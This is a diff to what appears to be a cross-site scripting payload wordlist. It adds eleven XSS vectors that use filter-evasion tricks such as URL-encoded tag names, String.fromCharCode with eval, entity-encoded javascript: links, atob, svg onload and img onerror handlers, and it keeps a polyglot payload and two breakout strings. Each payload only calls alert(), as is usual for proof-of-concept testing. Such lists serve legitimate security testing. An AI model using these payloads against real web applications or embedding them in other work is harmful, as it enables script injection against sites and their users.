@@ -1,3 +1,14 @@
+<scr%u0069pt>alert('XSS');</scr%u0069pt>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+<script>setTimeout('alert(\"XSS\")', 1000);</script>
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
+<script>document.write('<img src=x onerror=alert("XSS")>');</script>
+<a href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS')">Click me</a>
+{"user":"<script>alert('XSS')</script>"}
+<script>setInterval('alert("XSS")', 3000);</script>
+<div id="xss">Hover me!</div>
+<script>document.getElementById('xss').onmouseover=function(){this.innerHTML='<img src=x onerror=alert(1)>'}</script>
+<a href="javascript:alert(atob('WFNT'))">Click Me</a>
 %3Cinput%20type=text%20value=jaVasCript:/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e%3E%3C/input%3E
 "></select><img%20src=1%20onerror=alert(1)>
 \"-alert(1)}//
